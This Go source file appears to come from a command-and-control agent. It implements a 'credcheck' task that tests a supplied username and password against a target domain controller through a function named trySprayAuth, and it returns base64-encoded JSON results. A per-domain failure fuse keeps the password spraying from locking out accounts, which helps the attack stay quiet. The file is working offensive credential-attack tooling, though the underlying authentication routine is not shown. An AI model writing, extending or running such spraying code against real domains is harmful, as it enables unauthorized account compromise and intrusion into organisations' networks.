//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"sync"
)

type credCheckResult struct {
	User   string `json:"user"`
	Status string `json:"status"` // valid, invalid, locked, disabled, expired, error
	Error  string `json:"error,omitempty"`
}

type credCheckOutput struct {
	Results []credCheckResult `json:"results"`
	Summary struct {
		Total   int `json:"total"`
		Valid   int `json:"valid"`
		Invalid int `json:"invalid"`
		Locked  int `json:"locked"`
		Errors  int `json:"errors"`
	} `json:"summary"`
}

// Per-domain consecutive authentication-failure counter. Tripping the fuse
// stops validation for that domain until a successful ("valid") result
// resets it, protecting target accounts from lockouts caused by repeated
// rapid-fire checks.
const credCheckMaxFailures = 5

var (
	credCheckFailures   = map[string]int{}
	credCheckFailuresMu sync.Mutex
	// credCheckAuth is a seam for tests; production always uses trySprayAuth.
	credCheckAuth = trySprayAuth
)

func credCheckFuseTripped(domain string) bool {
	credCheckFailuresMu.Lock()
	defer credCheckFailuresMu.Unlock()
	return credCheckFailures[strings.ToLower(domain)] >= credCheckMaxFailures
}

func credCheckRecordFailure(domain string) {
	credCheckFailuresMu.Lock()
	credCheckFailures[strings.ToLower(domain)]++
	credCheckFailuresMu.Unlock()
}

func credCheckResetFailures(domain string) {
	credCheckFailuresMu.Lock()
	delete(credCheckFailures, strings.ToLower(domain))
	credCheckFailuresMu.Unlock()
}

// handleCredCheck validates a single credential against the target domain.
// Command format: user|domain|password|[dc_ip]
// A per-domain fuse trips after credCheckMaxFailures consecutive invalid or
// locked results; a "valid" result resets it.
func handleCredCheck(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 4)
	if len(parts) < 3 {
		res.Error = "format: user|domain|password|[dc_ip]"
		return
	}

	user := strings.TrimSpace(parts[0])
	domain := strings.TrimSpace(parts[1])
	password := parts[2]
	dc := ""
	if len(parts) > 3 {
		dc = strings.TrimSpace(parts[3])
	}
	if user == "" || domain == "" || password == "" {
		res.Error = "user, domain and password are required"
		return
	}

	if credCheckFuseTripped(domain) {
		res.Error = "fuse_tripped"
		return
	}

	status, errMsg := credCheckAuth(domain, user, password, dc)

	r := credCheckResult{User: user, Status: status, Error: errMsg}
	out := credCheckOutput{}
	out.Summary.Total = 1
	out.Results = append(out.Results, r)
	switch status {
	case "valid":
		out.Summary.Valid++
		credCheckResetFailures(domain)
	case "locked":
		out.Summary.Locked++
	default:
		if errMsg != "" && status != "invalid" {
			out.Summary.Errors++
		} else {
			out.Summary.Invalid++
		}
	}

	// Only deterministic auth failures count toward the fuse ("error" results
	// are transport issues and do not risk lockouts).
	if status == "invalid" || status == "locked" {
		credCheckRecordFailure(domain)
	}

	jsonBytes, _ := json.Marshal(out)
	res.Output = base64.StdEncoding.EncodeToString(jsonBytes)
	res.Encoding = "base64"
}